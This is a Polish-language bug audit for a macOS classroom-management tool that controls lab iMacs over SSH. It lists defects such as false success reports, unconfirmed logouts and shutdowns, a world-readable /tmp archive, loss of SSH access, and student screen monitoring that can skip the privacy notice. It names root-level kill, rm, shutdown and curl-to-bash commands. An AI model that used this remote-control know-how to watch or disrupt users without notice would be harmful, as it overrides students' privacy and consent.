RunningApp.isSystem uznaje za systemowe wszystko poza /Applications, /System/Applications i /Users/*/Applications. Od macOS 13 Safari działa z /System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app (sprawdzone na tym Macu), więc na każdym iMacu Safari znika z „Uruchomione aplikacje”, dopóki nie włączy się „Pokaż także programy działające w tle”; tak samo gry/programy uruchomione przez ucznia z Pobranych, z Biurka lub po App Translocation. Nauczyciel widzi np. „Brak otwartych aplikacji”, choć Safari jest otwarte. quitAllApps (Scripts+Classroom.swift:384) zna już ścieżkę cryptexu.

**Status:** naprawione (50bc9df)

### APL-03

**Zamykanie aplikacji o nazwach spoza ASCII zgłasza sukces, choć nic nie zamyka** – P1, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:219`

Biblioteka skryptów ustawia `export LC_ALL=C` (SSH.swift:43), a macOS `ps` w locale C koduje bajty spoza ASCII (sprawdzone: „Zó” → „ZM-CM-3”). quitApp porównuje surową nazwę UTF‑8 (np. wybraną z menu zainstalowanych, która pochodzi z `echo`) z zakodowanym wyjściem ps → brak PID → „Aplikacja nie jest uruchomiona.” i kod 0: „Zamknij” i „Wymuś zamknięcie” (GUI i cmcrctl quit-app) kończą się „Gotowe”, a aplikacja (np. Übersicht.app, programy z polskimi nazwami) działa dalej. Lista uruchomionych (l. 122) pokazuje zniekształcone nazwy, a „Zamknij” w wierszu dostaje zakodowaną ścieżkę → nie znajduje Info.plist → zamiast Apple Event „Zakończ” wysyła SIGTERM (wbrew README: uczeń może zapisać pracę). uninstallApp (l. 297) nie zabija takiej aplikacji przed rm.

**Status:** naprawione (0385006)

### APL-04

**Nieudane sprawdzenie aktualizacji pokazywane jako „System jest aktualny”** – P1, Aplikacje, instalacja, aktualizacje, `Sources/CMCRManager/AppModel.swift:889`

checkUpdates zapisuje wynik, gdy `r.succeeded || !r.stdout.isEmpty`, a listUpdates łączy stderr ze stdout (`softwareupdate --list 2>&1`). Każdy błąd z tekstem (brak połączenia z serwerem Apple, katalog zablokowany w sieci szkolnej, limit 600 s z samym nagłówkiem „Software Update Tool / Finding available software”) daje pustą listę tytułów → zielone „System jest aktualny” i brak plakietki w pasku bocznym. UpdateInfo.raw nie jest nigdzie pokazywane. cmcrctl updates list rozróżnia „No new software available” i wypisuje odpowiedź (CLI.swift:530-534).

**Status:** naprawione (9e4ce97)

### APL-18

**„Historia instalacji” pokazuje najstarsze wpisy, a najnowsze aktualizacje są ucinane** – P1, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:696`

updateHistory wykonuje `softwareupdate --history 2>&1 | head -n 40`, a softwareupdate wypisuje historię rosnąco według daty, czyli najstarsze wpisy najpierw (w kolejności z /Library/Receipts/InstallHistory.plist). Na iMacu z ponad 38 wpisami (ok. 2–3 lata aktualizacji macOS i Command Line Tools) przycisk „Historia instalacji” (UpdatesView.swift:43) oraz `cmcrctl updates history` (CLI.swift:550-553) pokazują tylko najstarsze instalacje. Ostatnie aktualizacje, które nauczyciel chce sprawdzić, są ucięte, a lista kończy się np. wpisem sprzed dwóch lat.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (7a4fd17)

### CLI-02

**Skrypt uruchomiony z Terminala bez listy komputerów działa na całej pracowni** – P1, cmcrctl, `Sources/cmcrctl/CLI.swift:193`

Ochrona z README („niezacytowane #3 w skrypcie kończy się błędem, a nie poleceniem dla całej pracowni”) opiera się wyłącznie na isatty(stdin). Skrypt uruchomiony z Terminala (bash zajecia.sh) dziedziczy TTY, więc exec/lock/power-later/lesson/install… bez KOMP trafiają do wszystkich komputerów; przy --yes (wymaganym w skryptach) power-later shutdown wyłączy całą pracownię bez pytania.

**Status:** naprawione (99e03de)

### DOD-03

**„Wyloguj natychmiast”, „Wyloguj” i krok „Wyloguj” w „Zakończ zajęcia” pomijają sesje w tle i zgłaszają sukces** – P1, Dodatkowe przeszukanie, `Sources/CMCRCore/Scripts.swift:1009`

logoutUser(force:) robi bootout tylko dla gui/$CONSOLE_UID. Gdy iMac stoi na oknie logowania, a sesja ucznia działa w tle po „Przełącz użytkownika”, skrypt wypisuje „Nikt nie jest zalogowany.” i kończy z kodem 0. Zadanie jest zielone, a w tabeli zajęć krok pokazuje „✔ użytkownik wylogowany” (LessonRoutine.swift:294, bo outcome() traktuje exit 0 jako done). Tak samo wygląda przypadek, gdy nikt nie był zalogowany. Sesja zostaje: następna klasa wybiera konto student na oknie logowania i wraca do sesji poprzedniego ucznia z otwartymi aplikacjami i zalogowanymi kontami w przeglądarce. Jeśli na konsoli jest administrator, a uczeń w tle, wylogowany zostaje administrator. Ten sam błąd ma cmcrctl logout (CLI.swift:576) i wariant z pytaniem o zapis (l.1014). Niezgodne z README l.145 („wylogowuje”) i l.166.

**Status:** naprawione (977ae3f)

### DOD-04

**Sesje w tle (szybkie przełączanie użytkowników) niewidoczne – potwierdzenia restartu, wyłączenia i wylogowania ich nie pokazują ani nie pomijają** – P1, Dodatkowe przeszukanie, `Sources/CMCRManager/PowerView.swift:433`

Stan zbiera wyłącznie właściciela /dev/console (SSH.swift:45-46, Scripts.swift:33). Gdy uczeń zablokuje ekran, a ktoś kliknie na ekranie blokady „Przełącz użytkownika”, iMac stoi na oknie logowania (console=root → ""), a sesja ucznia z otwartymi aplikacjami działa w tle. PowerConfirmSheet (l.344, 396-410) pokazuje wtedy „nikt nie jest zalogowany”. Nie liczy takiego komputera w loggedIn, a przełącznik „Pomiń komputery z zalogowanym uczniem” go nie pomija. needsAcknowledgement też go nie liczy. To samo w ConfirmSheet (Components.swift:319-321, np. instalacja aktualizacji z restartem) i w liczbie zalogowanych w potwierdzeniu „Zakończ zajęcia” (ClassroomView.swift:442). `shutdown -r/-h now` (Scripts.swift:1090/1098, Scripts+Classroom.swift:256) kończy sesję w tle bez pytania o zapis, wbrew README l.106. Ten sam brak dotyczy też kolumny „Zalogowany”, filtra „z zalogowanym użytkownikiem”, panelu szczegółów i kafelka podglądu („Nikt nie jest zalogowany (okno logowania)”), co jest niezgodne z README l.9.

**Status:** naprawione (977ae3f)

### KOM-01

**Powtórzenie restartu/wyłączenia/wylogowania z „Sesja i zasilanie” bez ponownego potwierdzenia** – P1, Komputery, zasilanie, `Sources/CMCRManager/PowerView.swift:413`

PowerConfirmSheet.perform uruchamia zadania przez model.runScript / classroom.delayedPower bez model.perform(skipping:confirmation:), więc Batch.confirmation == nil. AppModel.retry dla takiej partii od razu wywołuje rerun: „Powtórz na nieudanych” i „Powtórz na imacXX” w Zadaniach (także dla zadań zakończonych sukcesem) ponownie restartują, wyłączają, usypiają lub natychmiast wylogowują komputery bez arkusza z listą zalogowanych uczniów, a przycisk nie ma nawet wielokropka. Dodatkowo komputery pominięte przełącznikiem „Pomiń komputery z zalogowanym uczniem” są usuwane z listy zamiast trafić do wyników jako pominięte (.loggedInUser), więc nie widać ich w Zadaniach ani w „Zaznacz nieudane”.

**Status:** naprawione (a1788d6)

### KON-03

**Błąd zapisu hosts.json/settings.json nie jest pokazywany – zmiany giną po zamknięciu aplikacji** – P1, Konfiguracja, `Sources/CMCRCore/Store.swift:195`

ConfigStore.save przy błędzie zapisuje tylko lastSaveError i NSLog; aplikacja nigdy nie odczytuje lastSaveError. Gdy katalog konfiguracji jest tylko do odczytu, dysk jest pełny albo plik zablokowany, tabela Komputery („zmiany zapisują się od razu”) i ustawienia wyglądają na zapisane, a po ponownym uruchomieniu wraca stara lista i stare ustawienia.

**Status:** naprawione (b5d9416)

### KON-04

**Aplikacja nadpisuje zmiany listy zrobione w cmcrctl i nie widzi haseł zmienionych poza nią** – P1, Konfiguracja, `Sources/CMCRManager/AppModel.swift:232`

Lista jest wczytywana tylko w AppModel.init, a każda zmiana model.machines – także automatyczne uzupełnienie MAC w applyStatus – zapisuje całą listę z pamięci. Gdy aplikacja jest otwarta, `cmcrctl hosts add/remove/set`, `password set --host` (usesSharedPassword) czy `rename-computer --update-list` zapisują hosts.json, a najbliższy zapis aplikacji je cofa (np. dodany imac16 znika, po zmianie nazw wracają stare adresy .local). Keychain.get trzyma odczytane hasła w pamięci bez wygaśnięcia, a invalidateCache() nie jest nigdzie wywoływane – po `cmcrctl password set/clear` aplikacja używa starego hasła aż do restartu (sudo: „Błędne hasło administratora”).

**Status:** naprawione (b15a9e4)

### KON-05

**Po ustawieniu „własnego” hasła ponowne sprawdzenie stanu używa hasła wspólnego** – P1, Konfiguracja, `Sources/CMCRManager/SetupView.swift:571`

HostPasswordSheet.save najpierw zmienia model.machines[i].usesSharedPassword na false, ale do model.setPassword przekazuje zapamiętaną kopię `machine` (usesSharedPassword == true). setPassword → recheckAfterCredentialChange([m]) → refreshStatus(stara kopia) → Keychain.password(for:) zwraca hasło WSPÓLNE. Komputer z innym hasłem (np. Gotowość pokazuje „Odmowa dostępu” → „Hasło tego komputera…”) zaraz po zapisaniu poprawnego hasła znów dostaje „Odmowa dostępu – … błędne hasło administratora”, aż do odświeżenia w tle (do 2 min). Nauczyciel może uznać, że wpisał złe hasło.

**Status:** naprawione (e55f3c2)

### KON-06

**Ustawienie „Powiadamiaj o podglądzie” wyłącza komunikat dla ucznia, który README opisuje jako stały** – P1, Konfiguracja, `Sources/CMCRManager/SetupView.swift:915`

README obiecuje, że uczeń zawsze widzi komunikat „Administrator rozpoczął podgląd Twojego ekranu” i że bez potwierdzenia komunikatu obraz nie jest pobierany. Przełącznik w Konfiguracja › Ustawienia (i w oknie Ustawień › Podgląd ekranów) ustawia notifyOnObserve = false, a skrypt podglądu wtedy pomija komunikat i od razu pobiera obraz. Dotyczy też cmcrctl screenshot/screen-watch (CLI.swift:500 przekazuje settings.notifyOnObserve).

**Status:** pominięte – wymaga decyzji właściciela: poprawka zmienia to, co widzą uczniowie (komunikat o podglądzie), a polecenie każe o to najpierw zapytać. Propozycja: usunąć przełącznik i zawsze pokazywać komunikat (zgodnie z README) albo zostawić go z ostrzeżeniem o prywatności i opisać w README jako wyjątek.

### PLI-02

**Archiwum wysyłanych plików w /tmp jest czytelne dla wszystkich (0644) i zostaje po przerwaniu** – P1, Pliki, przeglądarka, `Sources/CMCRCore/Operations.swift:17`; także: `Sources/CMCRCore/Operations.swift:18`, `Sources/CMCRCore/Operations.swift:31`

Payload.make tworzy lokalny tar z umask 022 (0644), a SSH.upload kopiuje go `scp -r -p` (zachowuje tryb, SSH.swift:569) do /tmp/cmcr-up-XXXXXXXX.tar. Na iMacu plik ma 0644 w /tmp – zalogowany uczeń może go skopiować w czasie wysyłania i rozpakowywania, także gdy nauczyciel wysyła do katalogu administratora (~), do prywatnego folderu innego konta albo z uprawnieniami „Tylko właściciel”. Po Anuluj w trakcie scp lub gdy finalizacja się nie uruchomi (zerwane połączenie, uśpienie iMaca) plik zostaje w /tmp – usuwa go tylko pushFinalize. To samo dotyczy instalatorów (Operations.install). Ekspozycja ogranicza się do osoby zalogowanej na danym iMacu, stąd P1.

**Status:** naprawione (32503a4)

### PLI-03

**Konwencja cmcr-push oraz cmcrctl push/pull nie rozwijają {student} w folderze ucznia z ustawień** – P1, Pliki, przeglądarka, `Sources/CMCRManager/AppModel.swift:740`

Pole „Folder ucznia na iMacach” wprost dopuszcza {student} (podpis „{student} oznacza konto ucznia”, SetupView.swift:812); pullFiles, Zbierz prace, gotowość i SetupScript używają settings.resolve. pushConvention przekazuje `settings.sharedFolder` dosłownie, a pushFinalize zna tylko {console} i ~: dla „/Users/{student}/Public/cmcr” cofa się do /Users i kończy „✘ Folder /Users/{student}/Public nie istnieje … nie tworzę go” na każdym iMacu. Tak samo `cmcrctl push` (CLI.swift:392) i `cmcrctl pull` (CLI.swift:411 → „Brak folderu: /Users/{student}/…”). Ten sam brak ma LessonRoutine.swift:267 (poza tym obszarem).

**Status:** naprawione (797c6cb)

### PLI-12

**Usuwanie i pobieranie obejmuje zaznaczone elementy ukryte filtrem lub wyszukiwaniem** – P1, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserModel.swift:81`

refilter() zmienia tylko visibleEntries, a selectedEntries bierze elementy z całej listy. Scenariusz: „Ukryte pliki” włączone, ⌘A, „Ukryte pliki” wyłączone, „Usuń…” – usuwane są też niewidoczne pliki z kropką (np. .git ucznia); podobnie przy aktywnym wyszukiwaniu i ⌘-kliku. Arkusz wymienia tylko 5 pierwszych nazw.

**Status:** naprawione (3878c61)

### PLI-23

**Kliknięcie innego komputera na liście nie przełącza Przeglądarki plików** – P1, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserView.swift:66`

README: „kliknięcie innego komputera na liście pokazuje ten sam folder na nim”. Klik wiersza tylko podświetla (MachineListView: prywatny @ViewState highlighted, App.swift:252), a przeglądarka reaguje wyłącznie na zmianę pól wyboru i tylko, gdy zaznaczony jest dokładnie jeden komputer. Przy typowych 15 zaznaczonych (zaznaczenie jest zapamiętywane) klik ani dwuklik niczego w przeglądarce nie zmienia; działa tylko „Zaznacz tylko ten” albo wybór w polu „Komputer”.

**Status:** naprawione (7924cac)

### PRZ-03

**cmcrctl setup/readiness/setup-script po cichu pomijają nadmiarowe argumenty – konfiguracja może trafić na inny komputer** – P1, Przygotowanie iMaców, uaktualnienia, `Sources/cmcrctl/SetupCommands.swift:47`; także: `Sources/cmcrctl/SetupCommands.swift:56`

SetupCommandLine zbiera wszystkie argumenty bez „-” do positional (SetupScript.swift:464), a SetupCommands używa tylko positional.first (l. 47 i 77). Pozostałe argumenty są ignorowane, kod wyjścia 0. Według README nadmiarowy argument daje kod 2 i nic nie jest wykonywane; inne polecenia pilnują tego przez maxPositional. Skutki: `cmcrctl setup 3 7` konfiguruje tylko imac03, a imac07 po cichu pomija. `cmcrctl setup --hostname imac07 3` (w --help skryptu jest „--hostname NAZWA”) uruchamia konfigurację jako root na imac07 zamiast imac03. `cmcrctl setup-script --hostname imac05` zwraca kod 0 i wpisuje OPT_HOSTNAME='auto' – sprawdzone na .build/debug/cmcrctl, podobnie `setup-script extra-arg all` → rc=0.

**Status:** naprawione (f07b2af)

### PRZ-04

**--ssh-key-only wyłącza logowanie hasłem, choć klucz aplikacji nie został zainstalowany (utrata dostępu)** – P1, Przygotowanie iMaców, uaktualnienia, `setup/cmcr-imac-setup.sh:546`

Zabezpieczenie w step_sshd_tuning sprawdza tylko, czy KEY_FPS jest niepuste. KEY_FPS jest uzupełniany w pętli (l. 494), zanim klucz trafi do authorized_keys. Zapis może się nie udać, na przykład gdy: ~/.ssh należy do roota (typowe po `sudo ssh`, bo sudo w macOS zachowuje HOME) i mktemp jako admin zawodzi (l. 510); mv się nie powiedzie (l. 512); drugi klucz z --pubkey-file jest niepoprawny. Wtedy step_ssh_key kończy się „fail”, a mimo to powstaje 050-cmcr-manager.conf z „PasswordAuthentication no” i „KbdInteractiveAuthentication no”, który przechodzi sshd -t. Klucza aplikacji nie ma, logowanie hasłem jest wyłączone. Aplikacja i cmcrctl tracą dostęp do iMaca, trzeba iść do komputera. setup.json zapisuje przy tym odciski niezainstalowanych kluczy. README obiecuje, że skrypt „poprawia uprawnienia ~/.ssh”, a komunikat skryptu ostrzega „inaczej utracisz dostęp”.

**Status:** naprawione (4382653)

### PRZ-17

**cmcrctl setup-script po cichu ignoruje --verify/--dry-run – plik „do sprawdzenia” wprowadza zmiany jako root** – P1, Przygotowanie iMaców, uaktualnienia, `Sources/cmcrctl/SetupCommands.swift:42`

SetupCommandLine przyjmuje --verify i --dry-run w każdym poleceniu (SetupScript.swift:460-461), a gałąź setup-script (SetupCommands.swift:37-44) ignoruje cl.mode. SetupScript.standalone() podmienia tylko blok CMCR-DEFAULTS, a MODE=apply leży poza nim. Scenariusz: `cmcrctl setup-script --verify [--sudo-nopasswd …] > plik.sh` kończy się kodem 0, a `sudo bash plik.sh` przy iMacu od razu wprowadza wszystkie zmiany jako root, także te, które użytkownik chciał tylko podejrzeć. `cmcrctl setup-script --help` wypisuje przy tym „--verify  tylko sprawdź (nic nie zmienia)”, a według README opcja, której polecenie nie używa, daje kod 2 i nic nie jest wykonywane. Podobnie `readiness` po cichu przyjmuje opcje konfiguracji (np. --ssh-key-only).

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (f07b2af)

### UI-02

**Menu kontekstowe tabeli działu Komputery działa na jednym, przypadkowym komputerze** – P1, Interfejs, `Sources/CMCRManager/DashboardView.swift:234`

Tabela jest powiązana z model.selection, więc contextMenu(forSelectionType:) przy prawym kliknięciu w zaznaczony wiersz dostaje cały zbiór zaznaczonych. Kod bierze ids.first (kolejność Set nieokreślona) i buduje MachineContextMenu(machine: m). Scenariusz: kafelek „Włączone” zaznacza 12 komputerów, prawy klik na imac05 → nagłówek menu pokazuje np. imac11; „Odśwież stan”, „Obudź komputer”, „Kopiuj adres”, „Grupy” działają tylko na imac11, a „Pokaż szczegóły” i „Zaznacz tylko ten” zawężają 12-elementowe zaznaczenie (zapamiętywane) do imac11. Na liście komputerów to samo menu dostaje poprawnie MachineContextMenu(ids:) (App.swift:291).

**Status:** naprawione (fe7f85a). Test: brak automatycznego – menu kontekstowe widoku SwiftUI; sprawdzone w kodzie.

### UI-03

**„Wyloguj” wylogowuje wszystkie zaznaczone komputery bez arkusza potwierdzenia** – P1, Interfejs, `Sources/CMCRManager/PowerView.swift:99`

TargetButton „Wyloguj” (bez role: .destructive) od razu uruchamia Scripts.logoutUser(force: false) na model.selectedMachines – bez ConfirmSheet z listą zalogowanych uczniów i opcją ich pominięcia. README zalicza wylogowanie do niebezpiecznych operacji, które pokazują listę komputerów z zalogowanymi użytkownikami; cmcrctl logout zawsze pyta (CLI.swift:574). Jedno przypadkowe kliknięcie przy 15 zaznaczonych komputerach wylogowuje całą pracownię (aplikacje uczniów dostają polecenie zakończenia).

**Status:** naprawione (a1788d6)

### UI-04

**Potwierdzenie usunięcia/zastąpienia w Przeglądarce plików wymienia zaznaczone komputery zamiast przeglądanego** – P1, Interfejs, `Sources/CMCRManager/RemoteBrowserView.swift:376`

ConfirmRequest w confirmDelete (376) i startUpload (354) nie podaje targets, więc ConfirmationModifier użyje model.actionTargets. Przy kilku zaznaczonych komputerach zamiast zwykłego alertu pojawia się ConfirmSheet „Działanie obejmie 12 komputerów: imac01…imac12”, a od 5 komputerów wymagane jest „Rozumiem – działanie obejmie 12 komputerów i nie da się go cofnąć”, choć plik jest usuwany tylko na browser.host (który może nawet nie być zaznaczony). Gdy nauczyciel zaznaczy „Pomiń komputery, przy których ktoś jest zalogowany”, perform(skipping:) ustawia pendingSkip, a runChange → runBatch pomija przeglądany komputer z zalogowanym uczniem: usunięcie się nie wykonuje, a toast mówi „zaznaczone komputery są niedostępne”.

**Status:** naprawione (fe7f85a)

### WSP-02

**„Przerwij” na partii ostrzeżenia nie przerywa „Zakończ zajęcia”** – P1, Współbieżność, `Sources/CMCRManager/ClassroomModel.swift:332`

Batch.cancel() – przycisk „Przerwij” w „Wynik ostatniego działania” w dziale Zajęcia, w Zadaniach i w popoverze Aktywności – anuluje tylko zadania partii „Zakończenie zajęć – ostrzeżenie”, nie LessonRun. Completion tej partii sprawdza wyłącznie run.cancelled (false), więc startuje odliczanie, a po nim rest() wykonuje zamknięcie aplikacji, zbieranie, czyszczenie, wylogowanie i uśpienie/wyłączenie wszystkich komputerów. Nauczyciel, który przerwał ostrzeżenie, po N minutach traci niezapisane prace uczniów. Przerwanie partii „Rozpoczęcie zajęć” daje w tabeli „nie wykonano” zamiast „anulowano”.

**Status:** naprawione (b4be562)

### ZAD-01

**„Powtórz na nieudanych” używa starej kopii komputera (wspólne hasło, adres, port, usunięte iMaki)** – P1, Zadania, polecenia, `Sources/CMCRManager/AppModel+Jobs.swift:136`

retry()/rerun przekazują Machine zapisane w zadaniach w chwili startu partii (retryableMachines = jobs.map(\.machine)), a operacje (runScript → ssh → password(for: m)) używają tej migawki. Scenariusz z README: imac07 ma inne hasło → zadanie kończy się „Błędne hasło administratora (sudo)” → nauczyciel ustawia „własne” hasło (SetupView zmienia machines[i].usesSharedPassword = false) → „Powtórz na nieudanych” znów wysyła hasło wspólne (migawka ma usesSharedPassword == true) i znów się nie udaje. To samo po poprawieniu adresu/konta/portu; powtórzenie trafia też do komputerów usuniętych z listy, a selectProblems zaznacza ich nieistniejące id. Wake-on-LAN obchodzi to ręcznie (ClassroomModel.swift:239: „A retry passes the batch's copy of the Mac”), pozostałe operacje nie.

**Status:** naprawione (e55f3c2)

### ZAD-02

**„Przerwij zadania i zakończ” nie czeka na zatrzymanie na iMacach ani na zapis historii** – P1, Zadania, polecenia, `Sources/CMCRManager/AppModel+Jobs.swift:508`; także: `Sources/CMCRManager/App.swift:15`

Po potwierdzeniu (i przy restarcie dla uaktualnienia, linia 497) applicationShouldTerminate woła stopAllWork() i od razu zwraca .terminateNow. ProcessHandle.cancel() uruchamia zdalne zatrzymanie (SSH.cancelRemote) w Task.detached, które ginie razem z procesem – zwykle nie zdąży nawet uruchomić ssh, więc polecenia na iMacach działają dalej (przekaźniki FIFO), choć użytkownik wybrał „Przerwij”; wynik jest losowy per komputer. Kontynuacje execute (MainActor) też się nie wykonują, więc przerwane zadania nigdy nie są archiwizowane: w historii brak ich wpisu i wyjścia (albo partia pokazuje tylko pominięte komputery), a oczekujące zapisy kolejki JobHistory mogą przepaść.

**Status:** naprawione (f4013cd)

### ZAJ-03

**Niewysłane materiały raportowane jako „pominięto”, a zajęcia jako „Gotowe”** – P1, Zajęcia, podgląd, `Sources/CMCRCore/LessonRoutine.swift:237`; także: `Sources/CMCRManager/ClassroomModel.swift:384`

Gdy folder z materiałami nie istnieje, jest nieczytelny (np. brak zgody TCC na Dokumenty/Biurko, przeniesiony folder) albo spakowanie się nie uda, krok „Wyślij materiały” dostaje materials == nil i kończy się jako .skipped(„brak materiałów do wysłania”). Przyczyna trafia co najwyżej do notatki w zadaniu, zadanie kończy się sukcesem, a podsumowanie pokazuje „Gotowe na wszystkich komputerach.”. Nauczyciel jest przekonany, że uczniowie mają materiały. W cmcrctl lesson start błąd Payload.make jest całkowicie połykany.

**Status:** naprawione (df746f0)

### ZAJ-04

**Ponowne zalogowanie na to samo konto nie wyświetla komunikatu o podglądzie** – P1, Zajęcia, podgląd, `Sources/CMCRCore/ScreenCapture.swift:383`

README: komunikat jest pokazywany „raz na sesję podglądu i ponownie, gdy przy komputerze zaloguje się ktoś inny” (tooltip: „gdy zaloguje się inna osoba”). Kod porównuje tylko nazwę konta: skrypt pomija powiadomienie, gdy CONSOLE_USER == CMCR_LAST, a aplikacja przekazuje ObservationLedger.notifiedUser (nazwa konta) do każdego nowego strumienia; wylogowanie (STATE nouser) niczego nie zeruje. W pracowni wszyscy uczniowie używają wspólnego konta `student`, więc gdy Ściana ekranów jest otwarta cały dzień, kolejni uczniowie logujący się na to samo konto są oglądani bez żadnego komunikatu.

**Status:** pominięte – wymaga decyzji właściciela: poprawka sprawi, że uczniowie będą częściej widzieć komunikat o podglądzie (po każdym zalogowaniu, także na wspólne konto). Propozycja: kluczem powiadomienia jest sesja logowania (konto + identyfikator sesji), a wylogowanie zeruje zapamiętanego ucznia w skrypcie i w ObservationLedger.

### ZAJ-05

**Komunikat o podglądzie uznany za wyświetlony przy zablokowanym/uśpionym ekranie** – P1, Zajęcia, podgląd, `Sources/CMCRCore/ScreenCapture.swift:623`

Panel komunikatu zgłasza CMCR:NOTICE:shown, jeśli NSWindow.isVisible jest true po orderFrontRegardless. isVisible oznacza tylko, że okno jest wstawione na ekran – jest true także, gdy sesja ucznia jest zablokowana (wygaszacz z hasłem, ekran blokady), monitor śpi (np. po „Uśpij ekran” z kafelka) albo ekran zakrywa LockScreen z trybu uwagi. Skrypt zapisuje ucznia jako powiadomionego i zaczyna pobierać obraz; panel znika po 8 s, zanim uczeń odblokuje ekran. Po odblokowaniu uczeń jest oglądany bez komunikatu, wbrew README („dopóki iMac nie potwierdzi, że komunikat jest na ekranie, obraz nie jest pobierany”).

**Status:** pominięte – wymaga decyzji właściciela: poprawka zmienia, kiedy uczeń widzi komunikat o podglądzie (przy zablokowanym lub uśpionym ekranie komunikat będzie powtarzany po odblokowaniu). Propozycja: przed zgłoszeniem „shown” sprawdzać CGSSessionScreenIsLocked, CGDisplayIsAsleep i działający LockScreen; wtedy zgłaszać „hidden” i nie pobierać obrazu.

### APL-05

**README: instalacja „wyłącznie przez https://”, a kod przyjmuje też file://** – P2, Aplikacje, instalacja, aktualizacje, `README.md:170`

isSecureDownloadURL i skrypt installFromURL akceptują file:// (curl --proto '=https,file'), komunikat cmcrctl to wspomina, ale README i podpis w GUI („Tylko adresy https://.”) mówią wyłącznie o https://.

**Status:** otwarte

### APL-06

**Zabijanie po PID jako root bez sprawdzenia, czyj to proces** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:278`

killProcess wysyła `asroot kill -KILL PID` bez sprawdzenia użytkownika i programu. W GUI PID pochodzi z listy, która nie odświeża się sama (tylko przy wejściu do działu i po akcjach), więc „Wymuś zamknięcie…” w nieaktualnym wierszu (po wylogowaniu/zamknięciu aplikacji) może trafić w inny proces. `cmcrctl kill PID KOMP` przyjmuje wiele komputerów (all, 1-5), choć PID dotyczy jednego Maca – na pozostałych ginie jako root przypadkowy proces, bez potwierdzenia.

**Status:** otwarte

### APL-07

**Odinstalowanie zabija aplikację wszystkim użytkownikom, zanim sprawdzi, czy da się ją usunąć (Safari zawsze, inne bez Pełnego dostępu do dysku)** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:297`

Lista zainstalowanych zawiera /Applications/Safari.app (chronione SIP dowiązanie do cryptexu), a canUninstall (AppsView.swift:399) przepuszcza każdą ścieżkę z /Applications/. uninstallApp najpierw wysyła SIGKILL do wszystkich procesów „/Safari.app/Contents/MacOS/” (wszyscy użytkownicy), potem `rm -rf` kończy się „Operation not permitted” z mylącą radą o Pełnym dostępie do dysku. Podpowiedź przycisku obiecuje, że aplikacji systemowych nie da się tu odinstalować.

**Status:** otwarte

### APL-08

**Po „Anuluj” w trakcie instalacji z .dmg obraz zostaje zamontowany** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:415`

cmcr_install_dmg montuje obraz w /tmp/cmcr-mnt.XXXXXX i odmontowuje go dopiero po pętli instalacji. Anulowanie (SIGTERM/SIGKILL grupy procesów przez cancelScript) w trakcie installer/kopiowania nie odmontowuje obrazu – pułapka EXIT roota sprząta tylko $CMCR_TMP – więc ukryty (-nobrowse) obraz i katalog zostają do restartu iMaca.

**Status:** otwarte

### APL-09

**„Zainstaluj Homebrew” kończy się sukcesem, gdy pobranie instalatora się nie uda** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:564`

Przy błędzie curl (brak sieci, zablokowany GitHub) podstawienie `$(curl …)` daje pusty tekst, `bash -c ""` zwraca 0 – zadanie ma stan „Gotowe”, choć Homebrew nie zostało zainstalowane (błąd curl widać tylko w treści). To samo w gotowym poleceniu „Instalacja Homebrew” (Models.swift:105-106).

**Status:** otwarte

### APL-10

**Instalacja aktualizacji ukrywa błąd softwareupdate --list i zgłasza „Brak aktualizacji”** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:638`

installUpdates zapisuje wynik `softwareupdate --list` do pliku, ignoruje kod wyjścia i nigdy go nie wypisuje. Gdy lista się nie uda (brak sieci, serwer Apple niedostępny), LABELS jest puste → „✔ Brak aktualizacji do zainstalowania.” i kod 0; „Zainstaluj aktualizacje”, „Tylko pobierz” i cmcrctl updates install kończą się sukcesem bez instalacji.

**Status:** otwarte

### APL-12

**Adres instalatora i „Otwórz” nie są przycinane – spacja na początku daje błąd „tylko https://”** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRManager/InstallView.swift:96`

„Pobierz i zainstaluj” jest aktywny według isSecureDownloadURL, które przycina białe znaki, ale do skryptu trafia nieprzycięty downloadURL. Wklejony adres ze spacją na początku kończy się na iMacu komunikatem „Instalator można pobrać tylko przez https://”, ze spacją na końcu – błędem curl. Tak samo AppsView.swift:130: `open " https://…"` traktuje tekst jak ścieżkę pliku.

**Status:** otwarte

### APL-13

**Homebrew: przecinki w nazwach pakietów (jak w podpowiedzi) psują polecenie** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRManager/InstallView.swift:111`

Podpowiedź pola to „np. google-chrome, visual-studio-code”, ale brewArguments dzieli tylko po spacjach: powstaje `brew install --cask 'google-chrome,' 'visual-studio-code'` i brew kończy się błędem nieznanego pakietu.

**Status:** otwarte

### APL-14

**„Pokaż zainstalowane” (Unity) wypisuje też wszystkie dostępne wydania** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRManager/InstallView.swift:185`

Przycisk uruchamia `Unity Hub -- --headless editors --all`, które pokazuje i zainstalowane edytory, i wszystkie wydania dostępne w Hubie; same zainstalowane daje `editors --installed` (-i). Zainstalowane wersje giną w długiej liście. To samo w gotowym poleceniu „Lista zainstalowanych edytorów” (Models.swift:95-96).

**Status:** otwarte

### APL-15

**Po instalacji aktualizacji lista i plakietka nadal pokazują je jako dostępne** – P2, Aplikacje, instalacja, aktualizacje, `Sources/CMCRManager/UpdatesView.swift:131`

Po udanym „Zainstaluj aktualizacje” model.updates nie jest czyszczone ani sprawdzane ponownie – wiersz komputera dalej pokazuje pomarańczową ikonę z tytułami, a plakietka „Dostępne aktualizacje na N komputerach” (App.swift:178) zostaje do ręcznego „Sprawdź aktualizacje” lub restartu aplikacji.

**Status:** otwarte

### APL-16

**cmcrctl quit-app --force zabija aplikacje bez potwierdzenia (GUI pyta)** – P2, Aplikacje, instalacja, aktualizacje, `Sources/cmcrctl/CLI.swift:452`

